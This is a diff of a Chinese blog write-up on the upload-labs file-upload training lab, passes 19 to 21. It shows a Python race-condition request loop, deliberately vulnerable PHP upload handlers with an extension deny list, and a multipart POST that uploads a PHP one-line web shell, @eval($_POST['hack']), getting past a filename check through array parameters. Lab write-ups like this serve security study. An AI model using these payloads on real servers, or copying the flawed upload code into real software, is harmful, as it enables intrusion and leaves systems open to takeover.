+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://ip/upload-labs/upload/shell.php"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		html = requests.get(url)</span><br><span class="line">		<span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">			print(<span class="string">"success"</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">			print(<span class="string">"200"</span>)</span><br></pre></td></tr></table></figure>
 <h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><p>这一关和上面很像</p>
 <p>不过python连续访问的url要变成</p>
-<pre><code class="mathematica">127.0.0.1/upload-labs-master/include.php?file=upload/shell.jpg
-</code></pre>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/upload-labs-master/include.php?file=upload/shell.jpg</span><br></pre></td></tr></table></figure>
 <h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p>这关绕过方法用之前的<code>.php.</code>就可以</p>
 <p>不过这关和之前有个很明显的区别</p>
 <p>做了个保存名称的input</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
-
-        $file_name = $_POST[&#39;save_name&#39;];
-        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//在这里
-
-        if(!in_array($file_ext,$deny_ext)) {
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) { 
-                $is_upload = true;
-            }else{
-                $msg = &#39;上传出错！&#39;;
-            }
-        }else{
-            $msg = &#39;禁止保存为该类型文件！&#39;;
-        }
-
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
-</code></pre>
-<h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><pre><code class="php">$is_upload = false;
-$msg = null;
-if(!empty($_FILES[&#39;upload_file&#39;])){
-    //检查MIME
-    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
-    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){
-        $msg = &quot;禁止上传该类型文件!&quot;;
-    }else{
-        //检查文件名
-        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
-        if (!is_array($file)) {
-            $file = explode(&#39;.&#39;, strtolower($file));
-            //explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。
-        }
-
-        $ext = end($file);//end(array)函数，输出数组中的当前元素和最后一个元素的值。
-        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
-        if (!in_array($ext, $allow_suffix)) {
-            $msg = &quot;禁止上传该后缀文件!&quot;;
-        }else{
-            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];
-            //reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值
-            //count(array)函数，计算数组中的单元数目，或对象中的属性个数
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $msg = &quot;文件上传成功！&quot;;
-                $is_upload = true;
-            } else {
-                $msg = &quot;文件上传失败！&quot;;
-            }
-        }
-    }
-}else{
-    $msg = &quot;请选择要上传的文件！&quot;;
-}
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);<span class="comment">//在这里</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">            <span class="comment">//explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);<span class="comment">//end(array)函数，输出数组中的当前元素和最后一个元素的值。</span></span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            <span class="comment">//reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值</span></span><br><span class="line">            <span class="comment">//count(array)函数，计算数组中的单元数目，或对象中的属性个数</span></span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ol>
 <li>验证上传路径是否存在验证[‘upload_file’]的content-type是否合法（可以抓包修改）</li>
 <li>判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）</li>
@@ -805,26 +425,7 @@ if(!empty($_FILES[&#39;upload_file&#39;])){
 <p>这里可以用00截断</p>
 <p>也可以用数组绕过</p>
 <p>post包</p>
-<pre><code class="css">-----------------------------131314876217456529963542266439
-Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;yijuhua.php&quot;
-Content-Type: image/png
-
-&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;
------------------------------131314876217456529963542266439
-Content-Disposition: form-data; name=&quot;save_name[0]&quot;
-
-upload-20.php
------------------------------131314876217456529963542266439
-Content-Disposition: form-data; name=&quot;save_name[2]&quot;
-
-jpg
------------------------------131314876217456529963542266439
-Content-Disposition: form-data; name=&quot;submit&quot;
-
-上传
------------------------------131314876217456529963542266439--
-
-</code></pre>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-----------------------------131314876217456529963542266439</span></span><br><span class="line">Content-Disposition: form-data; name="upload_file"; filename="yijuhua.php"</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?<span class="selector-tag">php</span> <span class="keyword">@eval</span>($_POST['hack']);?&gt;</span><br><span class="line"><span class="selector-tag">-----------------------------131314876217456529963542266439</span></span><br><span class="line">Content-Disposition: form-data; name="save_name[0]"</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">upload-20</span><span class="selector-class">.php</span></span><br><span class="line"><span class="selector-tag">-----------------------------131314876217456529963542266439</span></span><br><span class="line">Content-Disposition: form-data; name="save_name[2]"</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">jpg</span></span><br><span class="line"><span class="selector-tag">-----------------------------131314876217456529963542266439</span></span><br><span class="line">Content-Disposition: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line"><span class="selector-tag">-----------------------------131314876217456529963542266439--</span></span><br></pre></td></tr></table></figure>
 
         </div>
         <!-- .entry-content -->
@@ -858,7 +459,7 @@ Content-Disposition: form-data; name=&quot;submit&quot;
           
             <a href="/2022/08/xsslab/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.yimian.xyz/img?type=moe">
               </div>
               <span class="label">
               Previous Post</span>
@@ -1093,9 +694,9 @@ $(document).ready(function() {
           <ul class="sub-menu">
             
               <li>
-                <a href="/categories/技术/">
+                <a href="/categories/ctf/">
                   <i class="fa fa-code" aria-hidden="true"></i>
-                  技术
+                  ctf
                 </a>
               </li>
             
